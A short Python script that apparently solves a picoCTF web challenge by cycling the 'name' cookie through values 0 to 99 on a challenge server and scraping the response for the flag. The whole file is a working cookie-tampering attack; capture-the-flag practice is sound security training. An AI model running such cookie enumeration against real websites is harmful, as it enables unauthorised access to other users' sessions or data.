#!/usr/bin/env python

import pwn
import requests
import re

regex = "picoCTF{.*?}"
url = "http://mercury.picoctf.net:17781/check"
s = requests.Session()

def Exploit():
    pwn.log.progress("Searching for the flag")
    for miaou in range (0,100):
        cookies = {'name': str(miaou)}
        req = s.get(url, cookies=cookies)
        req = req.content
        result = re.findall(regex, str(req))
        flag = result
        if result:
            for f in flag:
                pwn.warn("Cookie was: {}".format(cookies))
                pwn.success("Flag is: {}".format(f))
            return

if __name__ == "__main__":
    Exploit()
